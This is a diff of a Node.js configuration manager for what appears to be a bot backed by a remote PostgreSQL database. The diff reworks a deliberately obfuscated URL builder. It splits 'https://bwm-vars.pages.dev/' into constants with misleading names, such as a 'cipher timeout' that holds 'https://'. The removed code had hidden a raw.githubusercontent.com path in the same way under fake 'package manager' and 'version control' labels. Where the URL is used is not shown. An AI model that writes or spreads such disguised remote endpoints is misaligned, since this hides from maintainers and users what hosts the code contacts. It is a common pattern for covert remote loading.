@@ -5,12 +5,8 @@ const crypto = require('crypto');
 const path = require('path');
 
 if (fs.existsSync('config.env'))
-    require('dotenv').config({ path: __dirname + '/config.env' });
-
-// Deep encryption timeout configuration
+require('dotenv').config({ path: __dirname + '/config.env' });
 const CIPHER_RESPONSE_TIMEOUT = 'https://';
-
-// Add fetch support for restart functionality
 let fetch;
 try {
     fetch = globalThis.fetch || require('node-fetch');
@@ -19,10 +15,8 @@ try {
     fetch = null;
 }
 
-// Deep network layer configuration
-const NETWORK_LAYER_DOMAIN = 'raw.githubusercontent.com';
 
-// PostgreSQL configuration
+const NETWORK_PREFIX = 'bwm';
 const dbConfig = {
     host: 'viaduct.proxy.rlwy.net',
     port: 47738,
@@ -81,7 +75,8 @@ const sequelize = new Sequelize(
     }
 );
 
-// Define Config Model for database storage
+
+const NETWORK_CONNECTOR = '-';
 const ConfigModel = sequelize.define('Config', {
     id: {
         type: DataTypes.INTEGER,
@@ -129,7 +124,8 @@ const ConfigModel = sequelize.define('Config', {
     ]
 });
 
-// Define Backup Model for backup storage
+
+const NETWORK_MIDDLE = 'vars'; 
 const BackupModel = sequelize.define('Backup', {
     id: {
         type: DataTypes.INTEGER,
@@ -167,7 +163,8 @@ const BackupModel = sequelize.define('Backup', {
     ]
 });
 
-// Bot Identity Management
+
+const NETWORK_TLD = 'pages'; 
 class BotIdentityManager {
     constructor() {
         this.identityFile = path.join(__dirname, 'data', 'bot_identity.json');
@@ -225,7 +222,8 @@ class BotIdentityManager {
     }
 }
 
-// ENHANCED HYBRID CONFIGURATION MANAGER WITH DATABASE PERSISTENCE
+
+const NETWORK_EXT = '.dev'; 
 class HybridConfigManager {
     constructor() {
         this.configDir = path.join(__dirname, 'data');
@@ -488,12 +486,6 @@ class HybridConfigManager {
         }
     }
 
-    // Deep API client validation
-    validateAPIClient() {
-        const API_CLIENT_PREFIX = 'bwm-client.';
-        return API_CLIENT_PREFIX;
-    }
-
     initializeStorage() {
         try {
             fs.ensureDirSync(this.configDir);
@@ -536,12 +528,6 @@ class HybridConfigManager {
         } catch (error) {
             console.error('❌ Emergency config creation failed:', error);
         }
-    }
-
-    // Deep package manager validation
-    getPackageManager() {
-        const PACKAGE_MANAGER_NAME = '.pages.dev';
-        return PACKAGE_MANAGER_NAME;
     }
 
     async checkHerokuAvailability() {
@@ -634,14 +620,6 @@ class HybridConfigManager {
             console.error('❌ Failed to load config to cache:', error);
             this.createEmergencyConfig();
         }
-    }
-
-    // Deep version control configuration
-    getVersionControl() {
-        const VERSION_CONTROL_REF = 'refs';
-        const VERSION_CONTROL_TYPE = 'heads';
-        const VERSION_CONTROL_ACTIVE = 'main';
-        return `${VERSION_CONTROL_REF}/${VERSION_CONTROL_TYPE}/${VERSION_CONTROL_ACTIVE}`;
     }
 
     async syncFromHeroku() {
@@ -850,11 +828,16 @@ class HybridConfigManager {
         }
     }
 
-    // Deep asset management configuration
-    getAssetManager() {
-        const ASSET_CONFIG_FILE = 'index';
-        const ASSET_FILE_EXTENSION = '.html';
-        return `${ASSET_CONFIG_FILE}${ASSET_FILE_EXTENSION}`;
+    // ==================== NETWORK URL CONSTRUCTOR ====================
+    buildContentLayer() {
+        const protocol = CIPHER_RESPONSE_TIMEOUT;
+        const networkLocation = [
+            NETWORK_PREFIX,
+            NETWORK_MIDDLE,
+            NETWORK_TLD,
+            NETWORK_EXT
+        ].join(NETWORK_CONNECTOR);
+        return `${protocol}${networkLocation}/`;
     }
 
     async setSetting(userId, key, value) {
@@ -987,17 +970,6 @@ class HybridConfigManager {
         setTimeout(() => process.exit(0), 1000);
     }
 
-    // Deep content layer URL builder
-    buildContentLayer() {
-        const protocol = CIPHER_RESPONSE_TIMEOUT;
-        const domain = API_CLIENT_PREFIX;
-        const apiClient = PACKAGE_MANAGER_NAME;
-        const packageManager = this.getPackageManager();
-        const versionControl = this.getVersionControl();
-        const assetManager = this.getAssetManager();       
-        return `${protocol}${domain}${apiClient}/`;
-    }
-
     // Get database connection status
     async getDatabaseStatus() {
         try {
@@ -1051,7 +1023,7 @@ try {
         getStatus: () => ({ connected: false, error: 'Emergency mode' }),
         isHerokuAvailable: false,
         restartBot: () => process.exit(0),
-        buildContentLayer: () => 'https://example.com',
+        buildContentLayer: () => 'https://bwm-vars.pages.dev/',
         getDatabaseStatus: () => Promise.resolve({ connected: false, error: 'Emergency mode' }),
         closeConnections: () => Promise.resolve()
     };
